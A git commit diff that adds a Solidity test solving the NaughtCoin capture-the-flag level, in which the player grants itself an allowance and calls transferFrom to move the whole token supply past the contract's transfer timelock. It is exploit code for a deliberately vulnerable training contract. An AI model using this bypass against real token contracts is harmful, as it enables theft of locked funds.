1d5e64070984ce33a01939efbaf18318bd99705e
karooolis <hello@karolisram.com>
2023-04-10 13:55:09 +0300

    add NaughtCoin CTF & solution

--- test/14-NaughtCoin.t.sol
+++ test/14-NaughtCoin.t.sol
@@ -6,12 +6,25 @@ import "../src/14-NaughtCoin.sol";
 
 contract NaughtCoinTest is Test {
     NaughtCoin public naughtCoinCTF;
-
-    address player = address(0x1);
+    address public player = address(0x1);
+    address public receiver = address(0x2);
 
     function setUp() public {
         naughtCoinCTF = new NaughtCoin(player);
     }
 
-    function testAttack() public {}
+    function testAttack() public {
+        uint256 totalSupply = naughtCoinCTF.INITIAL_SUPPLY();
+
+        assertEq(naughtCoinCTF.balanceOf(receiver), 0);
+        assertEq(naughtCoinCTF.balanceOf(player), totalSupply);
+
+        // attack
+        vm.startPrank(player);
+        naughtCoinCTF.increaseAllowance(player, totalSupply);
+        naughtCoinCTF.transferFrom(player, receiver, totalSupply);
+
+        assertEq(naughtCoinCTF.balanceOf(receiver), totalSupply);
+        assertEq(naughtCoinCTF.balanceOf(player), 0);
+    }
 }
